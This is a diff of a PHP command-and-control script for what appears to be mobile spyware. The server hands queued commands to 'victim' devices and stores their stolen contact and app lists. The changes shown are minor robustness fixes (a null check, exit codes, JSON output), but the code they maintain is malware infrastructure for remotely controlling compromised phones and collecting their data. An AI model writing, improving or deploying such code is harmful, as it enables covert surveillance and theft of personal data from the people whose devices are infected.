@@ -106,6 +106,7 @@ if (isset($_POST['device_id']) and isset($_POST['check_cmd'])){
     $device_path = $VICTIM_FILE_PATH;
     $strJsonFileContents = file_get_contents($device_path);
     $victim_array = json_decode($strJsonFileContents, true);
+    if($victim_array==null) exit(0);
     $cmd_response = $victim_array['device_list'][$_POST['device_id']]['commands'];
     if($cmd_response!=null) 
         echo createJson($cmd_response);
@@ -113,7 +114,7 @@ if (isset($_POST['device_id']) and isset($_POST['check_cmd'])){
         echo createJson($response_data);
     unset($victim_array['device_list'][$_POST['device_id']]['commands']);
     file_put_contents($device_path, createJson($victim_array));
-    exit();
+    exit(0);
 }
 
 if (isset($_POST['contact_list'])){
@@ -197,7 +198,7 @@ if (isset($_POST['app_list'])){
     $device_id = $_POST['device_id'];
     file_put_contents(createFile('app-list', $device_id), createJson($f_list_arr));
     $response_data['status'] = true;
-    echo json_encode($response_data);
+    echo createJson($response_data);
 }
 
 /*
